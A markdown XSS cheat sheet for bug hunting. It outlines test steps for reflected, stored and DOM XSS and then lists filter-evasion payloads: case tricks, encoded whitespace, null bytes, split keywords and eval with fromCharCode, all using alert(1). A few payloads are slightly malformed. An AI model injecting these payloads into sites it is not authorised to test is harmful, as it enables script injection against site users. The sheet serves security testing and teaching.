# XSS Cheat Sheet

## Active XSS Hunting

### Attack Strategy

#### Reflected XSS
1. **Test Objectives:**
   - Identify where a value is stored into the DB and reflected back onto the page.
   - Assess the input they accept and try to bypass filters.

2. **Step 1 - Detect Input Vectors:**
   - Test all parameters for potential vulnerabilities.
   - Static code review can be effective for identifying input vectors.

3. **Step 2 - Analyse the Results:**
   - Depending on the context, analyze the results of the reflected XSS attack.
   - Check the impact of the attack vector.

#### Stored XSS
1. **Test Objectives:**
   - Identify where a value is reflected into the response.
   - Assess the input they accept and try to bypass filters.

2. **Step 1 - Detect Input Vectors:**
   - Test all parameters for potential vulnerabilities.
   - Static code review is effective for identifying input vectors.

3. **Step 2 - Analyse the Results:**
   - Depending on the context, analyze the results of the stored XSS attack.
   - Check the impact of the attack vector.

#### DOM XSS
1. **Test Objectives:**
   - Identify where a value is put into a DOM sink and reflected back onto the page.
   - Assess the input they accept and try to bypass filters.

2. **Step 1 - Detect Input Vectors:**
   - Test all parameters for potential vulnerabilities.
   - Static code review can help identify input vectors.

3. **Step 2 - Analyse the Results:**
   - Find DOM sinks by entering a random value and inspecting the developer console.
   - Check the impact of the attack vector.

## Passive XSS Hunting

### Attack Strategy

- Enter "'`><u>Rat was here<img src=x> into every field during registration.
- Inject into names and content of every object created.

### Filter Evasion Techniques

#### Basic Modifications
- Adding spaces, encoding tabs, newlines, and carriage returns.

#### Tags
```html
<script>alert(1)</script>
<script >alert(1)</script>
<script >alert(1)</script>
```

#### Encoded Tabs/Newlines/CR
```html
<script&#9>alert(1)</script>
<script&#10>alert(1)</script>
<script&#13>alert(1)</script>
```

#### Capital Letters
```html
ScRipT>alert(1)</sCriPt>
```

#### Adding Nullbytes
```html
%00script>alert(1)</script>
<script>al%00ert(1)</script>
```

#### Delimiters and Brackets
```html
<img onerror="alert(1)" src=x>
<img onerror='alert(1)' src=x>
```

#### URL Encoding
```html
<img onerror=&#34alert(1)&#34 src=x>
<img onerror=&#39alert(1)&#39 src=x>
```

#### Backticks
```html
<img onerror= alert(1) src=x>
<img onerror=&#96alert(1)&#96 src=x>
```

#### Double Use of Delimiters
```html
<<script>alert(1)//<</script>
```

#### Unknown Delimiters
```html
«input onsubmit=alert(1)»
```

#### Encoded Eval()
```html
<script>eval('a\u006cert(1)')</script>
<script>eval('al' + 'ert(1)')</script>
<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</script>
```

#### Using Filtered Words
```html
<scrscriptipt>alert(1)</scrscriptipt>
```

### Passive XSS Hunting
- Inject the payload into every field during registration and object creation.
- If a reflected value is encountered, determine the context.

## Notes
- When encountering a filtered script, consider variations or using different delimiters.
- Use the developer console for DOM XSS, and inspect source won't show DOM elements.

Happy hacking! 🚀✨
